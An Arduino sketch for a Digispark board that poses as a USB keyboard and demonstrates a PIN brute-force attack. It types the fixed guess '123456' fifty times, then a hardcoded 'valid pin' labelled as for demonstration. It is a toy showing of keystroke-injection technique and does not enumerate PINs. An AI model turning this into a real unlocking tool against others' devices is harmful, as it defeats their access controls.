#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}

void loop() {
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if emulating keyboard because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected.
  DigiKeyboard.delay(200); //Delay for host device to get ready 
  
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0); 
  
  //Actual bruteforce -
  digitalWrite(1, HIGH);
  
  for (int i = 0; i <50 ; i++){
  
  DigiKeyboard.print("123456"); 
    
  DigiKeyboard.delay(10); // val in miliseconds ; Tuning so that host device doesnt miss input.
  }
  
  //Hardcoded valid pin for demonstration purpose
  DigiKeyboard.print("000000");
  
  digitalWrite(1, LOW); 
 
 for(;;); // Stop the device after attack completes.
}
